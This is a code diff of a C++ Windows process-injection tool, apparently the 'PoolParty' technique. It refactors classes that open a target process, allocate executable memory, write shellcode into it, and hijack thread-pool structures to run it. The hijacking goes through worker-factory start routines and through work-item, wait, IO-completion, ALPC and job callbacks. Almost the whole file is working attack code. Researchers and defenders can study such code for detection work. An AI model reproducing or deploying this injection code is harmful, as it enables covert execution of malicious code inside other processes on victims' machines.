@@ -1,37 +1,37 @@
 #include "PoolParty.hpp"
 
 PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode) {
-	this->dwTargetPid = dwTargetPid;
-	this->cShellcode = cShellcode;
-	//this->szShellcodeSize = sizeof(cShellcode);
-	//this->szShellcodeSize = 208; // TODO: Fix this disgusting issue
-	this->szShellcodeSize = 224; // TODO: Fix this disgusting issue
+	m_dwTargetPid = dwTargetPid;
+	m_cShellcode = cShellcode;
+	//m_szShellcodeSize = sizeof(cShellcode);
+	//m_szShellcodeSize = 208; // TODO: Fix this disgusting issue
+	m_szShellcodeSize = 224; // TODO: Fix this disgusting issue
 }
 
-HANDLE PoolParty::GetTargetProcessHandle() {
-	auto hTargetPid = w_OpenProcess(PROCESS_ALL_ACCESS, FALSE, this->dwTargetPid);
+std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() {
+	auto hTargetPid = w_OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_dwTargetPid);
 	return hTargetPid;
 }
 
 HANDLE PoolParty::GetWorkerFactoryHandle() {
-	WorkerFactoryHandleDuplicator Duplicator{ this->dwTargetPid, this->hTargetPid };
+	WorkerFactoryHandleDuplicator Duplicator{ m_dwTargetPid, *m_p_hTargetPid };
 	auto hWorkerFactory = Duplicator.Duplicate(WORKER_FACTORY_ALL_ACCESS);
 	return hWorkerFactory;
 }
 
 WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation() {
 	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
-	w_NtQueryInformationWorkerFactory(this->hWorkerFactory, (WORKERFACTORYINFOCLASS)WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
+	w_NtQueryInformationWorkerFactory(m_hWorkerFactory, (WORKERFACTORYINFOCLASS)WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
 	return WorkerFactoryInformation;
 }
 
 LPVOID PoolParty::AllocateShellcodeMemory() {
-	LPVOID ShellcodeAddress = AllocateMemory(this->hTargetPid, this->szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID ShellcodeAddress = AllocateMemory(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	return ShellcodeAddress;
 }
 
 void PoolParty::WriteShellcode() {
-	WriteMemory(this->hTargetPid, this->ShellcodeAddress, this->cShellcode, this->szShellcodeSize);
+	WriteMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
 }
 
 void PoolParty::TriggerExecution() 
@@ -39,10 +39,10 @@ void PoolParty::TriggerExecution()
 }
 
 void PoolParty::Inject() {
-	this->hTargetPid = this->GetTargetProcessHandle();
-	this->hWorkerFactory = this->GetWorkerFactoryHandle();
-	this->WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation();
-	this->ShellcodeAddress = this->AllocateShellcodeMemory();
+	m_p_hTargetPid = this->GetTargetProcessHandle();
+	m_hWorkerFactory = this->GetWorkerFactoryHandle();
+	m_WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation();
+	m_ShellcodeAddress = this->AllocateShellcodeMemory();
 	this->WriteShellcode();
 	this->SetupExecution();
 	this->TriggerExecution();
@@ -66,7 +66,7 @@ WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwT
 
 void WorkerFactoryStartRoutineOverwrite::SetupExecution()
 {
-	WriteMemory(this->hTargetPid, this->WorkerFactoryInformation.StartRoutine, this->cShellcode, this->szShellcodeSize);
+	WriteMemory(*m_p_hTargetPid, m_WorkerFactoryInformation.StartRoutine, m_cShellcode, m_szShellcodeSize);
 }
 
 void WorkerFactoryStartRoutineOverwrite::TriggerExecution()
@@ -89,31 +89,31 @@ RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned cha
 void RemoteWorkItemInsertion::SetupExecution() 
 {
 	/* Read the TP_POOL of the target process */
-	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);
+	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 
 	auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
 
 	/* Allocate TP_WORK with a custom TP_POOL */
-	auto pWorkItem = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)this->ShellcodeAddress, NULL, NULL);
+	auto pWorkItem = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)m_ShellcodeAddress, NULL, NULL);
 
 	/* 
 		When a task is posted NTDLL would insert the task to the pool task queue list tail
 		To avoid using WriteProcessMemory later on to post the task, we modify the work item's properties as if it was already "posted"
 		In addition we make the work item exchangable so that ntdll!TppWorkerThread will process it correctly
 	*/
-	pWorkItem->CleanupGroupMember.Pool = (PFULL_TP_POOL)this->WorkerFactoryInformation.StartParameter;
+	pWorkItem->CleanupGroupMember.Pool = (PFULL_TP_POOL)m_WorkerFactoryInformation.StartParameter;
 	pWorkItem->Task.ListEntry.Flink = TaskQueueHighPriorityList;
 	pWorkItem->Task.ListEntry.Blink = TaskQueueHighPriorityList;
 	pWorkItem->WorkState.Exchange = 0x2;
 
 	/* Write the specially crafted work item to the target process address space */
-	auto RemoteWorkItemAddress = (PFULL_TP_WORK)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteMemory(this->hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
+	auto RemoteWorkItemAddress = (PFULL_TP_WORK)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteMemory(*m_p_hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
 	
 	/* To complete posting the work item we need to complete the task queue list insertion by modifying the pool side */
 	auto RemoteWorkItemTaskList = &RemoteWorkItemAddress->Task.ListEntry;
-	WriteMemory(this->hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
-	WriteMemory(this->hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
+	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
+	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
 }
 
 RemoteWorkItemInsertion::~RemoteWorkItemInsertion() 
@@ -131,20 +131,20 @@ RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsi
 void RemoteWaitCallbackInsertion::SetupExecution()
 {
 	/* Read the TP_POOL of the target process */
-	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);
+	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 
 	/* Duplicate the IoCompletion port handle associated with the target worker factory */
-	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
+	auto hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 
 	/* Create thread pool wait */
-	auto pWait = w_CreateThreadpoolWait((PTP_WAIT_CALLBACK)this->ShellcodeAddress, NULL, NULL);
+	auto pWait = w_CreateThreadpoolWait((PTP_WAIT_CALLBACK)m_ShellcodeAddress, NULL, NULL);
 
 	/* Write wait and direct structures into the target process */
-	auto RemoteWaitAddress = (PFULL_TP_WAIT)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteMemory(this->hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));
+	auto RemoteWaitAddress = (PFULL_TP_WAIT)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteMemory(*m_p_hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));
 
-	auto RemoteDirectAddress = (PTP_DIRECT)AllocateMemory(this->hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteMemory(this->hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));
+	auto RemoteDirectAddress = (PTP_DIRECT)AllocateMemory(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteMemory(*m_p_hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));
 
 	/* Create dispatcher object */
 	auto hEvent = w_CreateEvent(NULL, FALSE, FALSE, NULL);
@@ -172,26 +172,26 @@ RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD d
 void RemoteIoCompletionCallbackInsertion::SetupExecution()
 {
 	/* Read the TP_POOL of the target process */
-	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);
+	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 
 	/* Duplicate the IoCompletion port handle associated with the target worker factory */
-	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
+	auto hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 
 	/* Create the file to associate with the IO completion */
 	auto hFile = w_CreateFile(L"PoolParty_Invitation.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
 	/* Create a TP_IO */
-	auto pTpIo = w_CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)this->ShellcodeAddress, NULL, NULL);
+	auto pTpIo = w_CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)m_ShellcodeAddress, NULL, NULL);
 
 	// TODO: Should be filled by w_CreateThreadpoolIo
-	pTpIo->CleanupGroupMember.Callback = this->ShellcodeAddress;
+	pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;
 
 	/* Start async IO operation */
 	++pTpIo->PendingIrpCount;
 
 	/* Write the TP_IO to the target process */
-	auto RemoteIoAddress = (PFULL_TP_IO)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteMemory(this->hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO)); 
+	auto RemoteIoAddress = (PFULL_TP_IO)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteMemory(*m_p_hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO)); 
 
 	/* De-associate the file from its original IO completion and re-associate it with the IO completion of the target worker factory */
 	IO_STATUS_BLOCK IoStatusBlock{ 0 };
@@ -228,10 +228,10 @@ RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsi
 void RemoteAlpcCallbackInsertion::SetupExecution() 
 {
 	/* Read the TP_POOL of the target process */
-	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);
+	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 	
 	/* Duplicate the IoCompletion port handle associated with the target worker factory */
-	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
+	auto hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 	
 	/* 
 		Since we can not re-set the ALPC object IO completion port, we are creating a temporary ALPC object that will only be used to allocate a TP_ALPC structure
@@ -244,7 +244,7 @@ void RemoteAlpcCallbackInsertion::SetupExecution()
 		So we just use a temp ALPC object to help us allocate the TP_ALPC structure
 		we will later on modify the TP_ALPC to contain a new ALPC object, associated with the target's worker factory IO completion port
 	*/
-	auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)this->ShellcodeAddress, NULL, NULL);
+	auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)m_ShellcodeAddress, NULL, NULL);
 
 	/* Create an ALPC object that does not have an IO copmletion port already set */
 
@@ -262,8 +262,8 @@ void RemoteAlpcCallbackInsertion::SetupExecution()
 	pTpAlpc->AlpcPort = hAlpcConnectionPort;
 	
 	/* Write the TP_ALPC to the target process */
-	auto RemoteTpAlpcAddress = (PFULL_TP_ALPC)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteMemory(this->hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
+	auto RemoteTpAlpcAddress = (PFULL_TP_ALPC)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteMemory(*m_p_hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
 	
 	/* Associate the ALPC object with the IO completion of the target worker factory */
 	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
@@ -321,20 +321,20 @@ RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsign
 void RemoteJobCallbackInsertion::SetupExecution() {
 
 	/* Read the TP_POOL of the target process */
-	auto Pool = ReadMemory<FULL_TP_POOL>(this->hTargetPid, this->WorkerFactoryInformation.StartParameter);
+	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 
 	/* Duplicate the IoCompletion port handle associated with the target worker factory */
-	auto hIoCompletion = w_DuplicateHandle(this->hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
+	auto hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
 
 	/* Create a job object */
 	auto hJob = w_CreateJobObject(NULL, NULL);
 
 	/* Allocate TP_JOB */
-	auto pTpJob = w_TpAllocJobNotification(hJob, this->ShellcodeAddress, NULL, NULL);
+	auto pTpJob = w_TpAllocJobNotification(hJob, m_ShellcodeAddress, NULL, NULL);
 
 	/* Write the TP_JOB to the target process */
-	auto RemoteTpJobAddress = (PFULL_TP_JOB)AllocateMemory(this->hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteMemory(this->hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));
+	auto RemoteTpJobAddress = (PFULL_TP_JOB)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));
 
 	/* Zero out the IO completion port information of the job object */
 	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
